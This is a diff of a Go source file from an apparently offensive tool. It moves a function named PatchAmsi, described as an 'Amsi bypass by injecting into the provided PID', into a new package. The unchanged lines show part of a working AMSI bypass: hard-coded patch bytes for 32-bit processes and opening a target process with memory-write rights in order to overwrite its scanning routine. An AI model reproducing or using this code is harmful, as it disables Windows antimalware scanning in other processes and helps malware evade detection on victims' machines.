@@ -1,15 +1,11 @@
-package modules
+package patch
 
 import (
 	"errors"
 	"fmt"
 
+	"github.com/lum8rjack/diversion/cmd/modules"
 	"golang.org/x/sys/windows"
-)
-
-const (
-	PROCESS_VM_OPERATION uint32 = 0x0008
-	PROCESS_VM_WRITE     uint32 = 0x0020
 )
 
 // Amsi bypass by injecting into the provided PID
@@ -24,7 +20,7 @@ func PatchAmsi(pid int) error {
 	// 33 C0
 	// kept the first few instructions before the je instruction
 	// bytes for 32bit process
-	if IsWOW64Process() {
+	if modules.IsWOW64Process() {
 		newBytes = []byte{0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x8B, 0x4D, 0x0C, 0x33, 0xC0}
 	}
 
@@ -35,7 +31,7 @@ func PatchAmsi(pid int) error {
 	// dwDesiredAccess = PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020)
 	// bInheritHandle = False
 	// dwProcessId = PID
-	procHandle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, false, uint32(pid))
+	procHandle, err := windows.OpenProcess(modules.PROCESS_VM_OPERATION|modules.PROCESS_VM_WRITE, false, uint32(pid))
 
 	if err != nil {
 		rs := fmt.Sprintf("Error opening process with PID: %d\n", pid)
